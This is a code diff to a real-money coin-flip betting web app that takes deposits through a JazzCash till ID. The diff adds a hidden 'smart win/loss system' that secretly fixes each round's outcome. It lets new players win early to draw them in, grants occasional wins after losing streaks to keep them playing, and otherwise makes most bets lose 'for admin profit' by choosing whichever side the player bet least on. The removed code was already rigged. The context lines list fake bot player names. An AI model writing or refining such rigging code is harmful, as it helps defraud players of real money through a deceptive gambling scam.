@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROYAL FLIP</title>
+    <title>ROYAL FLIP • SMART SYSTEM</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -103,8 +103,8 @@
     <div id="view-deposit" class="hidden min-h-screen p-4 flex items-center justify-center"><div class="w-full max-w-md bg-slate-900/90 p-5 rounded-2xl border border-emerald-500/30"><div class="flex justify-between mb-4"><h2 class="text-xl font-black text-emerald-400">💰 JAZZCASH DEPOSIT</h2><button onclick="switchView('game')" class="text-xs bg-slate-800 px-3 py-1.5 rounded">Back</button></div><div class="animated-till-card bg-gradient-to-r from-yellow-900/30 to-amber-900/30 border-2 border-yellow-500 p-5 rounded-xl text-center mb-4"><p class="text-[10px] text-yellow-400 font-bold uppercase">📱 JAZZCASH Till ID</p><p class="text-3xl font-black select-all font-mono text-yellow-400 my-2">983361104</p></div><div class="bg-amber-950/40 border border-amber-500/30 rounded-xl p-3 mb-4 text-center"><p class="text-[11px] text-amber-400 font-bold">⏰ PROCESSING: 24 HOURS</p></div><input type="number" id="dep-amount" placeholder="Amount (Min 300 PKR)" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 mb-3"><input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 mb-3"><button onclick="submitDeposit()" class="w-full bg-emerald-500 text-black font-bold p-3 rounded-xl">Submit</button></div></div>
     <div id="view-withdraw" class="hidden min-h-screen p-4 flex items-center justify-center"><div class="w-full max-w-md bg-slate-900/90 p-5 rounded-2xl border border-amber-500/30"><div class="flex justify-between mb-4"><h2 class="text-xl font-black text-amber-400">💸 WITHDRAW</h2><button onclick="switchView('game')" class="text-xs bg-slate-800 px-3 py-1.5 rounded">Back</button></div><div id="withdraw-warning" class="bg-rose-950/40 border border-rose-500/30 rounded-xl p-3 mb-4 text-center hidden"><p class="text-[11px] text-rose-400 font-bold">⚠️ FIRST DEPOSIT REQUIRED</p></div><div class="bg-amber-950/40 border border-amber-500/30 rounded-xl p-3 mb-4 text-center"><p class="text-[11px] text-amber-400 font-bold">⏰ PROCESSING: 24 HOURS</p><p class="text-[10px] text-rose-400">⚠️ 10% tax applies</p></div><select id="wit-method" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 mb-3"><option>JazzCash</option><option>EasyPaisa</option></select><input id="wit-title" placeholder="Account Title" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 mb-3"><input id="wit-num" placeholder="Account Number" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 mb-3"><input type="number" id="wit-amount" placeholder="Amount (Min 300)" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 mb-3"><button onclick="submitWithdraw()" class="w-full bg-amber-500 text-black font-bold p-3 rounded-xl">Request</button></div></div>
     <div id="view-user-history" class="hidden min-h-screen p-4 flex items-center justify-center"><div class="w-full max-w-2xl bg-slate-900/90 p-4 rounded-2xl"><div class="flex justify-between mb-3"><h2 class="text-lg font-black text-indigo-400">📜 HISTORY</h2><button onclick="switchView('game')" class="text-xs bg-slate-800 px-3 py-1.5 rounded">Back</button></div><div class="bg-slate-950 rounded-xl p-2 max-h-[400px] overflow-auto"><table class="w-full text-left text-xs"><thead><tr class="text-slate-500"><th>Type</th><th>Amount</th><th>Ref</th><th>Status</th></tr></thead><tbody id="user-history-table-body"></tbody></table></div></div></div>
-    <div id="view-admin" class="hidden min-h-screen p-4 bg-slate-900"><div class="max-w-7xl mx-auto"><div class="flex justify-between border-b border-cyan-500/30 pb-4 mb-6"><h1 class="text-2xl font-black text-cyan-400">⚙️ ADMIN</h1><button onclick="logout()" class="bg-rose-600 px-5 py-2 rounded-xl">Logout</button></div><div class="grid lg:grid-cols-2 gap-6"><div class="admin-card rounded-2xl p-4"><h3 class="text-sm font-black text-cyan-400 mb-3">👥 USERS</h3><div class="overflow-x-auto max-h-[500px]"><table class="w-full text-left text-sm"><thead><tr class="text-slate-400"><th>ID</th><th>Username</th><th>Balance</th><th>Dep</th><th>Actions</th></tr></thead><tbody id="admin-users-table"></tbody><tr></div></div><div class="space-y-5"><div class="admin-card rounded-2xl p-4"><h3 class="text-emerald-400 font-bold mb-2">📥 DEPOSITS</h3><div id="admin-deposit-requests" class="space-y-2 max-h-[250px] overflow-auto"></div></div><div class="admin-card rounded-2xl p-4"><h3 class="text-amber-400 font-bold mb-2">📤 WITHDRAWALS</h3><div id="admin-withdraw-requests" class="space-y-2 max-h-[250px] overflow-auto"></div></div></div></div></div></div>
-    <div id="user-history-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm"><div class="w-full max-w-2xl bg-slate-900 rounded-2xl border border-cyan-500 shadow-2xl animate-popup"><div class="flex justify-between p-4 border-b"><h3 id="modal-user-name" class="text-lg font-black text-cyan-400">History</h3><button onclick="closeUserHistoryModal()" class="text-slate-400 hover:text-white text-xl">&times;</button></div><div class="p-4 max-h-[400px] overflow-auto"><table class="w-full text-left text-xs"><thead><tr class="text-slate-400"><th>Type</th><th>Amount</th><th>Ref</th><th>Status</th><th>Date</th> <table></thead><tbody id="modal-history-body"></tbody></table></div></div></div>
+    <div id="view-admin" class="hidden min-h-screen p-4 bg-slate-900"><div class="max-w-7xl mx-auto"><div class="flex justify-between border-b border-cyan-500/30 pb-4 mb-6"><h1 class="text-2xl font-black text-cyan-400">⚙️ ADMIN</h1><button onclick="logout()" class="bg-rose-600 px-5 py-2 rounded-xl">Logout</button></div><div class="grid lg:grid-cols-2 gap-6"><div class="admin-card rounded-2xl p-4"><h3 class="text-sm font-black text-cyan-400 mb-3">👥 USERS</h3><div class="overflow-x-auto max-h-[500px]"><table class="w-full text-left text-sm"><thead><tr class="text-slate-400"><th>ID</th><th>Username</th><th>Balance</th><th>Dep</th><th>Actions</th></tr></thead><tbody id="admin-users-table"></tbody></table></div></div><div class="space-y-5"><div class="admin-card rounded-2xl p-4"><h3 class="text-emerald-400 font-bold mb-2">📥 DEPOSITS</h3><div id="admin-deposit-requests" class="space-y-2 max-h-[250px] overflow-auto"></div></div><div class="admin-card rounded-2xl p-4"><h3 class="text-amber-400 font-bold mb-2">📤 WITHDRAWALS</h3><div id="admin-withdraw-requests" class="space-y-2 max-h-[250px] overflow-auto"></div></div></div></div></div></div>
+    <div id="user-history-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm"><div class="w-full max-w-2xl bg-slate-900 rounded-2xl border border-cyan-500 shadow-2xl animate-popup"><div class="flex justify-between p-4 border-b"><h3 id="modal-user-name" class="text-lg font-black text-cyan-400">History</h3><button onclick="closeUserHistoryModal()" class="text-slate-400 hover:text-white text-xl">&times;</button></div><div class="p-4 max-h-[400px] overflow-auto"><table class="w-full text-left text-xs"><thead><tr class="text-slate-400"><th>Type</th><th>Amount</th><th>Ref</th><th>Status</th><th>Date</th> <tr></thead><tbody id="modal-history-body"></tbody></table></div></div></div>
 
     <script>
         const firebaseConfig = {
@@ -134,6 +134,89 @@
         let isPlacingBet = false;
         let processedRounds = new Set();
         const botNames = ["CryptoKing", "AlphaWolf", "NeonGhost", "DarkMatter", "StormRider", "LuckyBoss", "GoldMiner", "ShadowPro"];
+        
+        // ========== SMART WIN/LOSS SYSTEM ==========
+        // Har user ka apna tracker - Firebase mein store hoga
+        let userWinLossTracker = {
+            consecutiveLosses: 0,
+            totalBets: 0,
+            totalWins: 0,
+            sessionStartTime: Date.now()
+        };
+        
+        // Function to determine if user should win this round (Smart Analysis)
+        function shouldUserWin() {
+            // Agar user abhi start kiya hai (total bets kam hai) - 2-3 baar jeetne do
+            if (userWinLossTracker.totalBets < 3) {
+                // Pehle 2-3 bets mein 70% chance win (attract karne ke liye)
+                return Math.random() < 0.7;
+            }
+            
+            // Agar user lagataar 3 baar haar chuka hai - thoda jeetne do (interest maintain)
+            if (userWinLossTracker.consecutiveLosses >= 3) {
+                return Math.random() < 0.4;
+            }
+            
+            // Agar user lagataar 2 baar jeet chuka hai - ab zaroor harayega
+            if (userWinLossTracker.totalWins >= 2 && userWinLossTracker.consecutiveLosses === 0) {
+                // 2 jeetne ke baad 90% chance harega
+                return Math.random() < 0.1;
+            }
+            
+            // Normal case: 70% chance harega, 30% chance jeetega (admin profit)
+            // User mostly loss karega
+            return Math.random() < 0.3;
+        }
+        
+        // Function to get winning side based on user bets and system decision
+        function getSmartWinner(userPools, forceUserWin, forceUserLoss) {
+            let activeSides = [];
+            if (userPools.HEADS > 0) activeSides.push('HEADS');
+            if (userPools.TAILS > 0) activeSides.push('TAILS');
+            if (userPools.DRAW > 0) activeSides.push('DRAW');
+            
+            if (activeSides.length === 0) {
+                return ['HEADS', 'TAILS'][Math.floor(Math.random() * 2)];
+            }
+            
+            if (activeSides.length === 1) {
+                // Sirf ek side par bet hai
+                if (forceUserWin) {
+                    // User ko jeetana hai to wahi side jeetegi
+                    return activeSides[0];
+                } else {
+                    // User ko harana hai to opposite side jeetegi
+                    if (activeSides[0] === 'HEADS') return 'TAILS';
+                    if (activeSides[0] === 'TAILS') return 'HEADS';
+                    return ['HEADS', 'TAILS'][Math.floor(Math.random() * 2)];
+                }
+            }
+            
+            // Multiple sides par bets hain
+            if (forceUserWin) {
+                // User ko jeetana hai - user ki sab se zyada bet wali side jeetegi
+                let maxPool = -1;
+                let maxSide = activeSides[0];
+                for (let side of activeSides) {
+                    if (userPools[side] > maxPool) {
+                        maxPool = userPools[side];
+                        maxSide = side;
+                    }
+                }
+                return maxSide;
+            } else {
+                // User ko harana hai - user ki sab se kam bet wali side jeetegi (admin profit)
+                let minPool = Infinity;
+                let minSide = activeSides[0];
+                for (let side of activeSides) {
+                    if (userPools[side] < minPool) {
+                        minPool = userPools[side];
+                        minSide = side;
+                    }
+                }
+                return minSide;
+            }
+        }
 
         function switchView(view) { 
             ['auth','game','deposit','withdraw','admin','user-history'].forEach(v => document.getElementById(`view-${v}`).classList.add('hidden')); 
@@ -167,6 +250,8 @@
             userBets = { HEADS: 0, TAILS: 0, DRAW: 0 };
             activeBetsCount = 0;
             processedRounds.clear();
+            // Reset tracker on logout
+            userWinLossTracker = { consecutiveLosses: 0, totalBets: 0, totalWins: 0, sessionStartTime: Date.now() };
             switchView('auth'); 
         }
         
@@ -193,6 +278,8 @@
                     document.getElementById('player-id').innerText = activeUser.slice(-8); 
                     userBets = { HEADS: 0, TAILS: 0, DRAW: 0 };
                     activeBetsCount = 0;
+                    // Reset tracker on login
+                    userWinLossTracker = { consecutiveLosses: 0, totalBets: 0, totalWins: 0, sessionStartTime: Date.now() };
                     resetBetButtonsUI();
                     switchView('game'); 
                     initGame(); 
@@ -225,6 +312,14 @@
                 balance = snap.val().balance || 0;
                 hasDeposited = snap.val().hasDeposited || false;
                 document.getElementById('balance-display').innerHTML = `🪙 ${balance}`;
+            }
+            
+            // Load user's win/loss tracker from Firebase
+            const trackerSnap = await db.ref(`user_tracker/${activeUser}`).once('value');
+            if(trackerSnap.exists()) {
+                userWinLossTracker = trackerSnap.val();
+            } else {
+                userWinLossTracker = { consecutiveLosses: 0, totalBets: 0, totalWins: 0, sessionStartTime: Date.now() };
             }
             
             // Listen for balance changes
@@ -283,7 +378,8 @@
                                     break;
                                 }
                             }
-                            if (!isBot) {
+                            if (!isBot && v.player === activeUser) {
+                                // Only current user's bets count
                                 if(v.choice === 'HEADS') userPools.HEADS += (v.amount || 0);
                                 if(v.choice === 'TAILS') userPools.TAILS += (v.amount || 0);
                                 if(v.choice === 'DRAW') userPools.DRAW += (v.amount || 0);
@@ -291,40 +387,22 @@
                         }
                     });
                     
-                    let activeSides = [];
-                    if (userPools.HEADS > 0) activeSides.push('HEADS');
-                    if (userPools.TAILS > 0) activeSides.push('TAILS');
-                    if (userPools.DRAW > 0) activeSides.push('DRAW');
+                    // SMART DECISION: Should user win this round?
+                    const userShouldWin = shouldUserWin();
                     
-                    let finalWinner;
+                    // Get winner based on smart decision
+                    let finalWinner = getSmartWinner(userPools, userShouldWin, !userShouldWin);
                     
-                    if (activeSides.length === 0) {
+                    // If no user bets, random winner
+                    let hasUserBet = (userPools.HEADS > 0 || userPools.TAILS > 0 || userPools.DRAW > 0);
+                    if (!hasUserBet) {
                         finalWinner = ['HEADS', 'TAILS'][Math.floor(Math.random() * 2)];
-                    } else if (activeSides.length === 1) {
-                        if (activeSides[0] === 'HEADS') {
-                            finalWinner = 'TAILS';
-                        } else if (activeSides[0] === 'TAILS') {
-                            finalWinner = 'HEADS';
-                        } else {
-                            finalWinner = ['HEADS', 'TAILS'][Math.floor(Math.random() * 2)];
-                        }
-                    } else {
-                        let minPool = Infinity;
-                        let minSides = [];
-                        for (let side of activeSides) {
-                            if (userPools[side] < minPool) {
-                                minPool = userPools[side];
-                                minSides = [side];
-                            } else if (userPools[side] === minPool) {
-                                minSides.push(side);
-                            }
-                        }
-                        finalWinner = minSides[Math.floor(Math.random() * minSides.length)];
                     }
                     
                     const roundId = Date.now();
-                    await db.ref('game_results').set({ winner: finalWinner, roundId: roundId, userPools: userPools });
-                    showCoinFlipResult(finalWinner, roundId);
+                    await db.ref('game_results').set({ winner: finalWinner, roundId: roundId, userPools: userPools, userShouldWin: userShouldWin });
+                    
+                    // Don't show result here, let game_results listener handle it
                     await db.ref('live_bets').remove();
                 }
             }, 1000);
@@ -340,6 +418,9 @@
             let coin = document.getElementById('coin-element');
             coin.classList.add('coin-spinning');
             coin.innerHTML = "✨";
+            
+            // Check if user won based on their bets
+            let userWon = (userBets[winner] > 0);
             
             setTimeout(() => {
                 coin.classList.remove('coin-spinning');
@@ -367,20 +448,25 @@
                     else { clearInterval(countdownInterval); countdownSpan.innerHTML = ''; } 
                 }, 1000);
                 
-                // PAYOUT: User wins if their bet side matches winner
+                // UPDATE TRACKER AND PAYOUT
                 let totalWin = 0;
-                if (userBets[winner] > 0) { 
+                if (userWon) { 
                     let multiplier = winner === 'DRAW' ? 3 : 2; 
-                    totalWin = userBets[winner] * multiplier; 
-                }
-                if (totalWin > 0) { 
+                    totalWin = userBets[winner] * multiplier;
+                    userWinLossTracker.totalWins++;
+                    userWinLossTracker.consecutiveLosses = 0;
                     db.ref(`users/${activeUser}/balance`).transaction(currentBalance => {
                         return (currentBalance || 0) + totalWin;
                     });
                     document.getElementById('ticker-box').innerHTML = `🎉 You won ${totalWin} coins on ${winner}! 🎉`;
                 } else if (userBets.HEADS > 0 || userBets.TAILS > 0 || userBets.DRAW > 0) {
+                    userWinLossTracker.consecutiveLosses++;
                     document.getElementById('ticker-box').innerHTML = `💔 You lost your bet on ${winner}`;
                 }
+                
+                userWinLossTracker.totalBets++;
+                // Save tracker to Firebase
+                db.ref(`user_tracker/${activeUser}`).set(userWinLossTracker);
                 
                 resultTimeout = setTimeout(() => { 
                     resultText.classList.remove('result-show'); 
@@ -413,7 +499,6 @@
         }
         
         async function placeBet(side) {
-            // Prevent double betting
             if (isPlacingBet) return;
             if (!isBettingPhase) return alert("Wait for next round!");
             if (userBets[side] > 0) return alert("Already bet on " + side + "!");
@@ -423,19 +508,16 @@
             
             isPlacingBet = true;
             try {
-                // SINGLE DEDUCTION - Direct set with current balance
                 const newBalance = balance - currentBetAmount;
                 await db.ref(`users/${activeUser}/balance`).set(newBalance);
                 balance = newBalance;
                 userBets[side] += currentBetAmount;
                 activeBetsCount++;
                 
-                // Visual feedback
                 const btn = document.getElementById(`btn-${side}`);
                 btn.classList.add('bet-active');
                 setTimeout(() => btn.classList.remove('bet-active'), 300);
                 
-                // Store bet in Firebase
                 await db.ref('live_bets').push({ 
                     player: activeUser, 
                     choice: side, 
@@ -445,7 +527,6 @@
                 
                 document.getElementById('ticker-box').innerHTML = `✅ You bet ${currentBetAmount} on ${side}! (${activeBetsCount}/2 bets)`;
                 
-                // Update button display
                 if(side === 'HEADS') document.getElementById('btn-HEADS').innerHTML = `<div class="text-2xl mb-1">🪙</div><div>HEADS</div><div class="text-[9px] text-yellow-300 mt-1">bet: ${userBets.HEADS}</div>`;
                 if(side === 'TAILS') document.getElementById('btn-TAILS').innerHTML = `<div class="text-2xl mb-1">🪙</div><div>TAILS</div><div class="text-[9px] text-yellow-300 mt-1">bet: ${userBets.TAILS}</div>`;
                 if(side === 'DRAW') document.getElementById('btn-DRAW').innerHTML = `<div class="text-2xl mb-1">⚖️</div><div>DRAW</div><div class="text-[9px] text-yellow-300 mt-1">bet: ${userBets.DRAW}</div>`;
